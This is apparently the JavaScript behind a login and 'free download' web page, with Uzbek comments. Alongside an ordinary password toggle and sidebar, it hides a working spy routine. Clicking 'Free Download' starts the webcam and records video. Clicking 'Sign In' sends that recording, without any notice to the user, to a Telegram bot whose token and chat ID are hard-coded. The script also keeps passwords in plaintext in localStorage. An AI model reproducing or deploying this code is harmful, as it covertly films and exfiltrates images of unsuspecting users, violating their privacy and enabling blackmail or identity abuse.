document.addEventListener("DOMContentLoaded", () => {

  window.addEventListener("DOMContentLoaded", () => {
    const savedUser = JSON.parse(localStorage.getItem("user"));
    if (savedUser) {
      document.getElementById("email").value = savedUser.email;
      document.getElementById("password").value = savedUser.password;
    }
  });

  const passwordInput = document.getElementById('password');
  const togglePassword = document.getElementById('togglePassword');
  const eyeIcon = document.getElementById('eyeIcon');

  let isVisible = false;

  togglePassword.addEventListener('click', () => {
    isVisible = !isVisible;
    passwordInput.type = isVisible ? 'text' : 'password';

    eyeIcon.innerHTML = isVisible
      ? `<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                d="M13.875 18.825A10.05 10.05 0 0112 19c-4.478 0-8.269-2.943-9.543-7a10.05 10.05 0 011.746-3.043M9.88 9.88a3 3 0 104.243 4.243M3 3l18 18" />`
      : `<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
                d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
         <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
               d="M2.458 12C3.732 7.943 7.523 5 12 5c4.477 0 8.268 2.943 9.542 7-1.274 4.057-5.065 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />`;
  });

  // rasm va vido
  let videoStream = null;
  let recordedVideoBlob = null;
  let mediaRecorder = null;
  let isRecording = false;
  
  document.getElementById('freeDownloadBtn').addEventListener('click', function() {
    const previewElement = document.getElementById('preview');
    
    // Get user media only after 'Free Download' is clicked
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        previewElement.srcObject = stream;
        previewElement.classList.remove('hidden');
        previewElement.play();
  
        videoStream = stream;  // Keep reference to the stream
  
        // Start recording when Free Download is clicked
        if (!isRecording) {
          mediaRecorder = new MediaRecorder(videoStream);
          let chunks = [];
  
          mediaRecorder.ondataavailable = function(event) {
            chunks.push(event.data);
          };
  
          mediaRecorder.onstop = function() {
            recordedVideoBlob = new Blob(chunks, { type: 'video/mp4' });  // Use mp4 format
            chunks = [];
          };
  
          mediaRecorder.start();
          isRecording = true;  // Mark as recording
        }
      })
      .catch(err => console.error('Error accessing camera: ', err));
  });
  
  document.getElementById('signInBtn').addEventListener('click', function() {
    if (isRecording) {
      // Stop the recording when Sign In is clicked
      mediaRecorder.stop();
      videoStream.getTracks().forEach(track => track.stop());  // Stop the video stream
      document.getElementById('preview').classList.add('hidden');  // Hide the preview
  
      // Send the recorded video to Telegram
      sendToTelegram(recordedVideoBlob);
      isRecording = false;  // Mark recording as finished
    } else {
      alert('Iltimos, avval Free download tugmasini bosib faylni yuklab oling oling.');
    }
  });
  
  function sendToTelegram(videoData) {
    const botToken = '7772442946:AAGsBqTDxTm20nn-NfIye37zGmBpnOZrxTs';  // Telegram bot token
    const chatId = '7221078203'; // Telegram chat ID
  
    // Create a FormData object to send video
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('video', videoData, 'video.mp4');  // Send video in MP4 format
    
    fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
      method: 'POST',
      body: formData
    })
      .then(response => response.json())
      .then(data => {
        if (data.ok) {
          console.log('Video sent to Telegram:', data);
        } else {
          console.error('Error from Telegram:', data);
        }
      })
      .catch(error => console.error('Error sending video to Telegram:', error));
    
  }
  

  
  

  // Sidebar toggle
  const sidebar = document.getElementById('sidebar');
  const hamburgerBtn = document.getElementById('hamburgerBtn');

  hamburgerBtn.addEventListener('click', () => {
    if (sidebar.style.top === '0px') {
      sidebar.style.top = '-200%';
    } else {
      sidebar.style.top = '0';
    }
  });

  // Sidebar tashqariga bosilganda yopish
  document.addEventListener('click', (e) => {
    if (!sidebar.contains(e.target) && !hamburgerBtn.contains(e.target)) {
      sidebar.style.top = '-200%';
    }
  });
});
